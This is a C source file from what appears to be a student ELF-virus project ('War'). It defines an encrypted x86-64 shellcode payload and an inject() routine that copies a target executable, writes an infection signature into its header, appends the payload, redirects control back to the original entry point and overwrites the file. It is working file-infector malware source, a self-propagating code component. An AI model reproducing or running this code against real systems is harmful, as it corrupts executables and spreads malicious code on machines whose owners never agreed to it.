/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   inject.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/03/12 18:20:42 by ddinaut           #+#    #+#             */
/*   Updated: 2019/03/20 19:41:32 by ddinaut          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "war.h"

char payload[] = {
	0x50, 0x57, 0x56, 0x52, 0x51, 0x41, 0x50, 0x41, 0x51, 0x41,
	0x52, 0xe8, 0x0c, 0x00, 0x00, 0x00, 0x2e, 0x2e, 0x2e, 0x57,
	0x4f, 0x4f, 0x44, 0x59, 0x2e, 0x2e, 0x2e, 0x0a, 0xbf, 0x01,
	0x00, 0x00, 0x00, 0x5e, 0xba, 0x0c, 0x00, 0x00, 0x00, 0xb8,
	0x01, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xe8, 0x09, 0x00, 0x00,
	0x00, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x00,
	0x5f, 0xc6, 0x07, 0x2a, 0xc6, 0x47, 0x01, 0x2a, 0xc6, 0x47,
	0x02, 0x2a, 0xc6, 0x47, 0x03, 0x2a, 0xc6, 0x47, 0x04, 0x2a,
	0xc6, 0x47, 0x05, 0x2a, 0xc6, 0x47, 0x06, 0x2a, 0xc6, 0x47,
	0x07, 0x2a, 0xbe, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x15,
	0x98, 0xff, 0xff, 0xff, 0xb9, 0x42, 0x00, 0x00, 0x00, 0xe8,
	0x05, 0x00, 0x00, 0x00, 0xe9, 0xef, 0x00, 0x00, 0x00, 0x55,
	0x48, 0x89, 0xe5, 0x48, 0x81, 0xec, 0x88, 0x01, 0x00, 0x00,
	0x49, 0x89, 0xd1, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x46,
	0x88, 0x84, 0x04, 0x88, 0x00, 0x00, 0x00, 0x44, 0x89, 0xc0,
	0x99, 0xf7, 0xfe, 0x48, 0x63, 0xd2, 0x0f, 0xb6, 0x04, 0x17,
	0x42, 0x88, 0x44, 0x04, 0x88, 0x49, 0x83, 0xc0, 0x01, 0x49,
	0x81, 0xf8, 0x00, 0x01, 0x00, 0x00, 0x75, 0xd9, 0xba, 0x00,
	0x00, 0x00, 0x00, 0xbe, 0x00, 0x00, 0x00, 0x00, 0x4c, 0x8d,
	0x44, 0x24, 0x88, 0x0f, 0xb6, 0xbc, 0x14, 0x88, 0x00, 0x00,
	0x00, 0x40, 0x0f, 0xb6, 0xc7, 0x01, 0xf0, 0x42, 0x0f, 0xb6,
	0x34, 0x02, 0x01, 0xf0, 0x89, 0xc6, 0xc1, 0xfe, 0x1f, 0xc1,
	0xee, 0x18, 0x01, 0xf0, 0x0f, 0xb6, 0xc0, 0x29, 0xf0, 0x89,
	0xc6, 0x48, 0x98, 0x44, 0x0f, 0xb6, 0x94, 0x04, 0x88, 0x00,
	0x00, 0x00, 0x44, 0x88, 0x94, 0x14, 0x88, 0x00, 0x00, 0x00,
	0x40, 0x88, 0xbc, 0x04, 0x88, 0x00, 0x00, 0x00, 0x48, 0x83,
	0xc2, 0x01, 0x48, 0x81, 0xfa, 0x00, 0x01, 0x00, 0x00, 0x75,
	0xb2, 0x85, 0xc9, 0x7e, 0x4a, 0x8d, 0x41, 0xff, 0x49, 0x8d,
	0x7c, 0x01, 0x01, 0x31, 0xd2, 0x31, 0xc0, 0x48, 0x83, 0xc0,
	0x01, 0x0f, 0xb6, 0xc0, 0x0f, 0xb6, 0x8c, 0x04, 0x88, 0x00,
	0x00, 0x00, 0x01, 0xca, 0x0f, 0xb6, 0xd2, 0x0f, 0xb6, 0xb4,
	0x14, 0x88, 0x00, 0x00, 0x00, 0x40, 0x88, 0xb4, 0x04, 0x88,
	0x00, 0x00, 0x00, 0x88, 0x8c, 0x14, 0x88, 0x00, 0x00, 0x00,
	0x02, 0x8c, 0x04, 0x88, 0x00, 0x00, 0x00, 0x41, 0x30, 0x09,
	0x49, 0x83, 0xc1, 0x01, 0x4c, 0x39, 0xcf, 0x75, 0xc2, 0x48,
	0x81, 0xc4, 0x88, 0x01, 0x00, 0x00, 0xc9, 0xc3, 0x41, 0x5a,
	0x41, 0x59, 0x41, 0x58, 0x59, 0x5a, 0x5e, 0x5f, 0x58, 0xe9,
	0xba, 0xba, 0xfe, 0xca
};

__INLINE__ static void	*_memcpy(void *d, void *s, size_t size)
{
	char *s1 = d;
	char *s2 = s;

	for (size_t n = 0 ; n < size ; n++)
		s1[n] = s2[n];
	return (s1);
}

void		inject(t_data *data)
{
	revert_two(&data->key, (char*)infect, (size_t)inject - (size_t)infect);
	update_two(&data->key, (char*)inject, (size_t)release - (size_t)inject);

	if (data->context == false)
		goto ERR;

	data->context = false;
	int		size = data->virus.size + data->virus.note->p_offset;
	void	*map = mmap(0, size, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
	if (map == MAP_FAILED)
		goto ERR;

	register int	off = 0;
	register int	lim = 0;
	uint8_t			*src = data->bin.map;
	uint8_t			*dst = map;

	// step 1 : copy
	lim = data->virus.data->p_offset + data->virus.data->p_filesz;
	while (off < lim)
	{
		*dst++ = *src++;
		off++;
	}

	// step 2 : insert signature
	data->header = (Elf64_Ehdr*)map;
	*(uint32_t*)&data->header->e_ident[EI_PAD] = SIGNATURE;

	// step 3 : pad
	lim = data->virus.note->p_offset;
	while (off < lim)
	{
		*dst++ = 0;
		off++;
	}

	// step 4 : inject itself
	uint8_t	*bkp = NULL;
//	uint8_t	*beg = (uint8_t*)start;
	uint8_t	*beg = (uint8_t*)payload;

//	for (register int i = 0 ; i < (int)data->virus.size ; i++)
	for (register int i = 0 ; i < (int)sizeof(payload) ; i++)
	{
		if (*beg == 0xe9)// && bkp == NULL)
			bkp = dst + 1;
		*dst++ = *beg++;
		off++;
	}

	data->bin_entry = ((data->bin_entry - data->vrs_entry) - (((size_t)cypher_beg - (size_t)start) - 4));
	_memcpy(bkp, &data->bin_entry, 4);
	write(data->bin.fd, map, size);
	munmap(map, size);
	data->context = true;

ERR:
	revert_two(&data->key, (char*)release, (size_t)cypher_end  - (size_t)release);
	release(data);
}
